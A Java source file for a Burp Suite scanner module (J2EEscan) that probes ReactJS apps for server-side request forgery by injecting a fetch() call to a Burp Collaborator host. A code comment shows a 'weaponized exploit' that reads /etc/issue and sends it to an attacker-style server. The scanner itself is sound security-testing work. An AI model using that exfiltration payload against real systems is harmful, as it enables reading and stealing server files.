package burp.scan.issues.impl;

import burp.*;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.passive.Confidence;
import burp.scan.issues.IModule;
import burp.scan.lib.Risk;
import burp.scan.passive.CustomScanIssue;

import java.io.PrintWriter;
import java.util.*;

/**
 * 
 * ReactJS SSRF Scanner
 * 
 * References: 
 *   - http://10degres.net/aws-takeover-ssrf-javascript/
 * 
 *
 */
public class JavascriptSSRF implements IModule {

    private static final String TITLE = "ReactJS SSRF Scanner";
    private static final String DESCRIPTION = "J2EEscan identified a potential SSRF vulnerability";

    private static final String SSRF_REMEDY = "Execute a code review activity to mitigate the SSRF vulnerability<br />"
            + "<b>References</b>:<br /><br />"
            + "http://10degres.net/aws-takeover-ssrf-javascript/<br />"
            + "https://reactjs.org/docs/faq-ajax.html<br />"
            + "https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API";

    private PrintWriter stderr;

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint, WebPageInfo webInfo) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        stderr = new PrintWriter(callbacks.getStderr(), true);
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        // weaponized exploit fetch('file:///etc/issue').then(res=>res.text()).then((r)=>fetch('https://poc.myserver.com/?r='+r));
        String payload = "fetch('https://%s')";

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();

        // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
        String payloadReactSSRF = String.format(payload, currentCollaboratorPayload);

        // make a request containing our injection test in the insertion point
        byte[] checkRequest = insertionPoint.buildRequest(payloadReactSSRF.getBytes());

        
        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest);
        byte[] response = checkRequestResponse.getResponse();
        
        // Poll Burp Collaborator for remote interaction
        List<IBurpCollaboratorInteraction> collaboratorInteractions
                = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

        if (!collaboratorInteractions.isEmpty()) {

            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    reqInfo.getUrl(),
                    checkRequestResponse,
                    TITLE,
                    DESCRIPTION,
                    SSRF_REMEDY,
                    Risk.High,
                    Confidence.Certain
            ));
        }

        return issues;

    }

}
